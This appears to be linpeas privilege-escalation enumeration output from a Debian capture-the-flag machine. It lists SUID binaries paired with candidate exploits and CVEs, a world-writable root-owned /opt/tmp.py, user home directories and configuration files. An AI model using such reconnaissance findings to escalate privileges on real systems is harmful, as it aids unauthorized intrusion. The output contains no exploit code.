/usr/share/openssh/sshd_config                                                                                                                                                  
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 May 27 11:06 /etc/pam.d                                                                                                                             
-rw-r--r-- 1 root root 2133 Jun 17  2017 /etc/pam.d/sshd




╔══════════╣ Analyzing Keyring Files (limit 70)
drwx------ 2 james osboxes 4096 Apr 26  2021 /home/james/.local/share/keyrings                                                                                                  
drwxr-xr-x 2 root root 4096 Apr 26  2021 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                  
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                    
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                
                                                                                                                                                                                
-rw-r--r-- 1 root root 5138 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5147 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2775 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 7483 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7492 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2275 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 3780 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg
-rw-r--r-- 1 root root 2851 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg
-rw-r--r-- 1 root root 3452 Feb 13  2017 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 36941 May 25  2017 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 17538 May 25  2017 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2410 Jul 18  2020 /var/lib/apt/lists/deb.debian.org_debian_dists_stretch_Release.gpg
-----BEGIN PGP SIGNATURE-----
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
Ds4G
=cqbr
-----END PGP SIGNATURE-----

drwx------ 3 james osboxes 4096 Apr 26  2021 /home/james/.gnupg


╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                

























-rw-r--r-- 1 root root 553164 Feb 16  2016 /usr/share/gutenprint/5.2/xml/printers.xml























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 May 15  2017 /etc/skel/.bashrc                                                                                                                      
-rw-r--r-- 1 james osboxes 3526 Jun 18  2017 /home/james/.bashrc
-rw-r--r-- 1 root root 1001 Aug 22  2017 /home/mindy/.bashrc





-rw-r--r-- 1 root root 675 May 15  2017 /etc/skel/.profile
-rw-r--r-- 1 james osboxes 675 Jun 18  2017 /home/james/.profile


-rw------- 1 root root 0 Aug 22  2017 /home/mindy/.rhosts




                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                                         
                                         ╚═══════════════════╝                                                                                                                  
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                
strings Not Found                                                                                                                                                               
strace Not Found                                                                                                                                                                
-rwsr-xr-x 1 root root 39K May 17  2017 /bin/su                                                                                                                                 
-rwsr-xr-x 1 root root 39K Mar 22  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 30K Jun 23  2016 /bin/fusermount
-rwsr-xr-x 1 root root 67K Nov 10  2016 /bin/ping
-rwsr-xr-x 1 root root 158K Feb 26  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 26K Mar 22  2017 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 35K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 22K May 24  2017 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 57K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 48K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-- 1 root dip 355K Nov 11  2016 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 14K May 24  2017 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 514K Jun 17  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5.4K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 46K Apr  5  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 9.6K Jul  7  2017 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 14K Jan 14  2017 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                
-rwxr-sr-x 1 root shadow 34K May 27  2017 /sbin/unix_chkpwd                                                                                                                     
-rwxr-sr-x 1 root tty 26K Mar 22  2017 /usr/bin/wall
-rwxr-sr-x 1 root shadow 22K May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9.6K Apr 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 65K May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root crontab 39K May  3  2015 /usr/bin/crontab
-rwxr-sr-x 1 root mail 18K Jan 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 422K Jun 17  2017 /usr/bin/ssh-agent
-rwxr-sr-x 1 root utmp 5.4K Feb 18  2016 /usr/lib/i386-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root mail 14K Mar 23  2017 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-sr-x 1 root root 9.6K Jul  7  2017 /usr/lib/xorg/Xorg.wrap

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                        
/etc/ld.so.conf                                                                                                                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/i386-linux-gnu.conf
/lib/i386-linux-gnu
/usr/lib/i386-linux-gnu
/lib/i686-linux-gnu
/usr/lib/i686-linux-gnu
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                 
Current capabilities:                                                                                                                                                           
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/arping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/i386-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                 
                                                                                                                                                                                
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                         
files with acls in searched folders Not Found                                                                                                                                   
                                                                                                                                                                                
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                      
/usr/bin/gettext.sh                                                                                                                                                             

╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                                                                                                        
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27 11:05 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py

╔══════════╣ Unexpected in root
/initrd.img.old                                                                                                                                                                 
/vmlinuz.old
/vmlinuz
/initrd.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                               
total 24                                                                                                                                                                        
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27 11:06 ..
-rw-r--r--   1 root root   663 Apr 12  2016 bash_completion.sh
-rw-r--r--   1 root root  1941 Nov  7  2016 vte-2.91.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                 
                                                                                                                                                                                
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                    
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                    
═╣ Can I read shadow files? ............. No                                                                                                                                    
═╣ Can I read shadow plists? ............ No                                                                                                                                    
═╣ Can I write shadow plists? ........... No                                                                                                                                    
═╣ Can I read opasswd file? ............. No                                                                                                                                    
═╣ Can I write in network-scripts? ...... No                                                                                                                                    
═╣ Can I read root folder? .............. No                                                                                                                                    
                                                                                                                                                                                
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                          
/home/mindy/bin/cat
/home/mindy/bin/env
/home/mindy/bin/ls
/home/mindy/.bash_logout
/home/mindy/.ssh
/home/mindy/.bash_history
/home/mindy/.rhosts
/home/mindy/.bashrc
/home/mindy/.shosts
/home/mindy/.bash_profile
/home/james/.bash_history
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/mindy                                                                                                                                                                     
/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                               
/var/log/kern.log
/var/log/syslog
/var/log/messages
/var/log/daemon.log
/home/mindy/.gnupg/gpg.conf
/home/mindy/.gnupg/pubring.kbx
/home/mindy/.gnupg/trustdb.gpg

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                                                                       
                                                                                                                                                                                
╔══════════╣ Files inside /home/mindy (limit 20)
total 32                                                                                                                                                                        
drwxr-x--- 5 mindy mindy 4096 Jul 26 05:53 .
drwxr-xr-x 4 root  root  4096 Apr 26  2021 ..
lrwxrwxrwx 1 root  root     9 Nov 18  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_logout
-rw-r--r-- 1 root  root   338 Aug 22  2017 .bash_profile
-rw-r--r-- 1 root  root  1001 Aug 22  2017 .bashrc
drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
drwx------ 3 mindy mindy 4096 Jul 26 05:53 .gnupg
-rw------- 1 root  root     0 Aug 22  2017 .rhosts
-rw------- 1 root  root     0 Aug 22  2017 .shosts
drw------- 2 root  root  4096 Apr 26  2021 .ssh
-rw------- 1 mindy mindy   33 Jul 25 03:34 user.txt

╔══════════╣ Files inside others home (limit 20)
/home/james/.bash_logout                                                                                                                                                        
/home/james/.ICEauthority
/home/james/.local/share/tracker/data/tracker-store.journal
/home/james/.local/share/tracker/data/tracker-store.ontology.journal
/home/james/.local/share/gnome-settings-daemon/input-sources-converted
/home/james/.local/share/xorg/Xorg.0.log
/home/james/.local/share/xorg/Xorg.0.log.old
/home/james/.local/share/folks/relationships.ini
/home/james/.profile
/home/james/.bashrc

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                
╔══════════╣ Backup folders
                                                                                                                                                                                
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 20 Apr  5  2019 /etc/vmware-tools/tools.conf.old                                                                                                         
-rw-r--r-- 1 root root 1219 Jun 18  2017 /etc/xml/sgml-data.xml.old
-rw-r--r-- 1 root root 3319 Jun 18  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 10151 Jun 18  2017 /etc/xml/docbook-xml.xml.old
-rw-r--r-- 1 root root 673 Jun 18  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 22679 Apr 26  2021 /var/log/Xorg.0.log.old
-rw-r--r-- 1 root root 191 Jun 18  2017 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 5512 Aug  6  2017 /lib/modules/4.9.0-3-686-pae/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 34640 Apr  5  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 26180 Mar 13  2017 /usr/lib/evolution/evolution-backup
-rw-r--r-- 1 root root 25932 Mar 13  2017 /usr/lib/evolution/modules/module-backup-restore.so
-rw-r--r-- 1 root root 5406 Apr 25  2017 /usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/backuppage.ui
-rw-r--r-- 1 root root 475 Feb 25  2017 /usr/share/tracker/tracker-backup.xml
-rw-r--r-- 1 root root 303 Jan 24  2017 /usr/share/doc/hdparm/changelog.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 194817 Nov 23  2016 /usr/share/doc/x11-common/changelog.Debian.old.gz
-rwxr-xr-x 1 root root 1513 Oct 19  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 331845 Mar 13  2017 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 1567 Mar 13  2017 /usr/share/evolution/errors/org-gnome-backup-restore.error
-rw-r--r-- 1 root root 5562 Sep 20  2016 /usr/share/help/el/gnome-help/backup-how.page
-rw-r--r-- 1 root root 5132 Sep 20  2016 /usr/share/help/el/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 3614 Sep 20  2016 /usr/share/help/el/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 6104 Sep 20  2016 /usr/share/help/el/gnome-help/backup-what.page
-rw-r--r-- 1 root root 7040 Sep 20  2016 /usr/share/help/el/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 3678 Sep 20  2016 /usr/share/help/el/gnome-help/backup-why.page
-rw-r--r-- 1 root root 5305 Sep 20  2016 /usr/share/help/el/gnome-help/backup-where.page
-rw-r--r-- 1 root root 4569 Sep 20  2016 /usr/share/help/el/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2778 Apr  1  2017 /usr/share/help/el/seahorse/misc-key-backup.page
-rw-r--r-- 1 root root 4718 Mar 13  2017 /usr/share/help/el/evolution/backup-restore.page
-rw-r--r-- 1 root root 2543 Mar 13  2017 /usr/share/help/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 3253 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2891 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2230 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 3419 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-what.page
-rw-r--r-- 1 root root 4246 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2141 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3222 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2691 Sep 20  2016 /usr/share/help/sv/gnome-help/backup-check.page
-rw-r--r-- 1 root root 3191 Mar 13  2017 /usr/share/help/sv/evolution/backup-restore.page
-rw-r--r-- 1 root root 5048 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-how.page
-rw-r--r-- 1 root root 5211 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 3242 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 5072 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-what.page
-rw-r--r-- 1 root root 5807 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 3136 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4947 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3877 Sep 20  2016 /usr/share/help/ta/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2743 Sep 20  2016 /usr/share/help/id/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2442 Sep 20  2016 /usr/share/help/id/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1703 Sep 20  2016 /usr/share/help/id/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 2911 Sep 20  2016 /usr/share/help/id/gnome-help/backup-what.page
-rw-r--r-- 1 root root 3721 Sep 20  2016 /usr/share/help/id/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1628 Sep 20  2016 /usr/share/help/id/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2642 Sep 20  2016 /usr/share/help/id/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2180 Sep 20  2016 /usr/share/help/id/gnome-help/backup-check.page
-rw-r--r-- 1 root root 4265 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3776 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2646 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4826 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-what.page
-rw-r--r-- 1 root root 4942 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2563 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4137 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3178 Sep 20  2016 /usr/share/help/mr/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2488 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2021 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1543 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 2480 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-what.page
-rw-r--r-- 1 root root 3559 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1448 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-why.page
-rw-r--r-- 1 root root 2393 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-where.page
-rw-r--r-- 1 root root 1889 Sep 20  2016 /usr/share/help/zh_CN/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2543 Mar 13  2017 /usr/share/help/zh_CN/evolution/backup-restore.page
-rw-r--r-- 1 root root 4852 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-how.page
-rw-r--r-- 1 root root 4474 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 3127 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4888 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-what.page
-rw-r--r-- 1 root root 5461 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 3121 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-why.page
-rw-r--r-- 1 root root 4616 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3924 Sep 20  2016 /usr/share/help/ru/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2149 Apr  1  2017 /usr/share/help/ru/seahorse/misc-key-backup.page
-rw-r--r-- 1 root root 2540 Mar 13  2017 /usr/share/help/ru/evolution/backup-restore.page
-rw-r--r-- 1 root root 3812 Sep 20  2016 /usr/share/help/de/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3430 Sep 20  2016 /usr/share/help/de/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2729 Sep 20  2016 /usr/share/help/de/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 4015 Sep 20  2016 /usr/share/help/de/gnome-help/backup-what.page
-rw-r--r-- 1 root root 4976 Sep 20  2016 /usr/share/help/de/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2643 Sep 20  2016 /usr/share/help/de/gnome-help/backup-why.page
-rw-r--r-- 1 root root 3700 Sep 20  2016 /usr/share/help/de/gnome-help/backup-where.page
-rw-r--r-- 1 root root 3245 Sep 20  2016 /usr/share/help/de/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2523 Apr  1  2017 /usr/share/help/de/seahorse/misc-key-backup.page
-rw-r--r-- 1 root root 4005 Mar 13  2017 /usr/share/help/de/evolution/backup-restore.page
-rw-r--r-- 1 root root 2973 Sep 20  2016 /usr/share/help/ca/gnome-help/backup-how.page
-rw-r--r-- 1 root root 2624 Sep 20  2016 /usr/share/help/ca/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1669 Sep 20  2016 /usr/share/help/ca/gnome-help/backup-restore.page

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)                                                                                             
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3016002
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3016002
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3016002

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
                                                                                                                                                                                

 -> Extracting tables from /var/lib/colord/storage.db (limit 20)
                                                                                                                                                                                


 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                                                                                                




╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                      
total 12K
drwxr-xr-x  3 root root 4.0K Apr 26  2021 .
drwxr-xr-x 12 root root 4.0K Apr 26  2021 ..
drwxr-xr-x  4 root root 4.0K Apr 26  2021 html

/var/www/html:
total 68K
drwxr-xr-x 4 root root 4.0K Apr 26  2021 .
drwxr-xr-x 3 root root 4.0K Apr 26  2021 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 May 15  2017 /etc/skel/.bash_logout                                                                                                                  
-rw-r--r-- 1 root root 0 Jun 18  2017 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 0 Jun 18  2017 /etc/.java/.systemPrefs/.system.lock
-rw------- 1 root root 0 Jun 18  2017 /etc/.pwd.lock
-rw------- 1 Debian-gdm Debian-gdm 7542 Jul 25 03:34 /var/lib/gdm3/.ICEauthority
-r--r--r-- 1 Debian-gdm Debian-gdm 11 Jul 25 03:34 /tmp/.X1024-lock
-rw-r--r-- 1 root root 2555 Jul 23  2017 /usr/lib/jvm/.java-1.8.0-openjdk-i386.jinfo
-rw-r--r-- 1 root root 0 Jul 25 03:34 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 0 Aug 22  2017 /home/mindy/.bash_logout
-rw------- 1 root root 0 Aug 22  2017 /home/mindy/.shosts
-rw-r--r-- 1 james osboxes 220 Jun 18  2017 /home/james/.bash_logout
-rw------- 1 james osboxes 640 Aug 22  2017 /home/james/.ICEauthority

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 mindy mindy 777018 Jul 24 01:56 /tmp/linpeas.sh                                                                                                                    
